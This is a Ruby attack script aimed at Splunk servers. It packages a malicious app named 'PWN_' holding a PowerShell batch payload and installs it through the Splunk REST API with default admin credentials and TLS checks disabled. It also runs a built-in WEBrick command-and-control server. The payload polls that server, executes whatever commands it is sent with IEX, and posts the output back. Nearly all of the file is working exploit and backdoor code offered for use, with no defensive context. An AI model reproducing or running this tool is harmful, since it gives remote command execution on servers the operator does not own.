require 'tmpdir'
require 'net/http'
require 'securerandom'
require 'base64'

#Lets hard code our location variables
$lhost = '127.0.0.1'
$lport = '8181'
#$api_base = 'https://127.0.0.1:8089/en-us/'
$api_base = 'https://127.0.0.1:8089/'
$username = 'admin'
$password = 'changeme'
$payload_file = "run.bat"
$payload = %Q*powershell.exe -Command "while ($true) { Start-Sleep -Seconds 5; try { $resp = Invoke-WebRequest -Uri http://#{$lhost}:#{$lport}/command -UseBasicParsing -ErrorAction Stop; Write-Host $resp; if ($resp.StatusCode -eq 200) { $cmd = [System.Text.Encoding]::UTF8.GetString($resp.Content); $exec = IEX $cmd; $out = $exec | Out-String; Invoke-WebRequest -Uri http://127.0.0.1:8181/output -Method POST -Body ([Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($out))) -UseBasicParsing; } } catch { Write-Host \"Error: $_\" } }"*

$command_mutex = Mutex.new
$command = nil
# Generate a random app name

SPLUNK_APP_NAME = "PWN_#{SecureRandom.uuid}"

def create_splunk_bundle()
  tmp_path = Dir.mktmpdir
  app_path = File.join(tmp_path, SPLUNK_APP_NAME)
  bin_dir = File.join(app_path, 'bin')
  local_dir = File.join(app_path, 'local')

  FileUtils.mkdir_p(bin_dir)
  FileUtils.mkdir_p(local_dir)

  # Write payload file
  payload_path = File.join(bin_dir, $payload_file)
  File.write(payload_path, $payload)
  File.chmod(0700, payload_path)

  # Create inputs.conf
  inputs_conf = <<~CONF
    [script://$SPLUNK_HOME/etc/apps/#{SPLUNK_APP_NAME}/bin/#{$payload_file}]
    disabled = false
    index = default
    interval = 60.0
    sourcetype = test
  CONF
  File.write(File.join(local_dir, 'inputs.conf'), inputs_conf)

  # Create tarball
  tarball = File.join(Dir.tmpdir, "#{SPLUNK_APP_NAME}.tar")
  system("tar -cf #{tarball} -C #{tmp_path} #{SPLUNK_APP_NAME}")

  FileUtils.rm_rf(tmp_path)
  tarball
end


def remove_app()
  puts 'removing app'
  uri = URI("#{$api_base}services/apps/local/#{SPLUNK_APP_NAME}")
  # Install app via Splunk API
  req = Net::HTTP::Delete.new(uri)
  req.basic_auth($username, $password)
  http = Net::HTTP.new(uri.host, uri.port)
  http.use_ssl = true
  http.verify_mode = OpenSSL::SSL::VERIFY_NONE
  res = http.request(req)
  puts res

  if res.code.to_i >= 400
    puts "[-] Failed to delete app: #{res.message}"
    puts res.body
  else
    puts "[+] App Removed!"
  end

end


def upload_bundle()

  uri = URI("#{$api_base}services/apps/local/")
  # Install app via Splunk API
  install_url = "http://#{$lhost}:#{$lport}/install"
  req = Net::HTTP::Post.new(uri)
  req.basic_auth($username, $password)
  req.set_form_data({ 'name' => install_url, 'filename' => true, 'update' => true })
  http = Net::HTTP.new(uri.host, uri.port)
  http.use_ssl = true
  http.verify_mode = OpenSSL::SSL::VERIFY_NONE
  puts 'sending install request'
  res = http.request(req)
  puts res

  if res.code.to_i >= 400
    puts "[-] Failed to install app: #{res.code}"
    puts res.body
  else
    puts "[+] App installed!"
  end
end



server = WEBrick::HTTPServer.new(
  Port: 8181,
  BindAddress: '127.0.0.1',
  AccessLog: [],
  Logger: WEBrick::Log.new('/dev/null')
)

# === GET /install => Serve the tarball ===
server.mount_proc '/install' do |req, res|
  puts "Splunk is pulling tarball #{SPLUNK_APP_NAME}"
  if File.exist?("/tmp/#{SPLUNK_APP_NAME}.tar")
    res.status = 200
    res['Content-Type'] = 'application/x-tar'
    res.body = File.read("/tmp/#{SPLUNK_APP_NAME}.tar")
  else
    res.status = 404
    res.body = "Tarball not found"
  end
end



server.mount_proc '/command' do |req, res|

  $command_mutex.synchronize do
  #puts "[C2] Agent checked in for command"
  if $command
    #puts "[C2] Sending command: #{$command}"
    res.status = 200
    res.body = $command
    $command = nil
  else
    #puts "[C2] No command queued"
    res.status = 404
    res.body = ''
  end
end
end



server.mount_proc '/output' do |req, res|
  if !req.body.nil?
    puts Base64.decode64(req.body)
    res.status = 200
    res.body = 'ok'
  else 
    res.status = 200
    res.body = 'ok'
  end
end

# Graceful shutdown on Ctrl+C
trap("INT") do
  #Thread.new {remove_app()}
  puts "\n[!] Ctrl+C caught — shutting down WEBrick"
  server.shutdown
end



Thread.new do
  loop do
    input = STDIN.gets.strip
    if input == 'install'
        puts 'Got install request'
        puts 'creating bundle'
        puts 'uploading bundle'
        create_splunk_bundle()
        upload_bundle()

    elsif input == 'remove'
        remove_app()
    else

    unless input.empty?
      $command_mutex.synchronize do
        $command = input
      end
    end
  end
  end
end


puts "[*] WEBrick server running on http://127.0.0.1:8181"
server.start


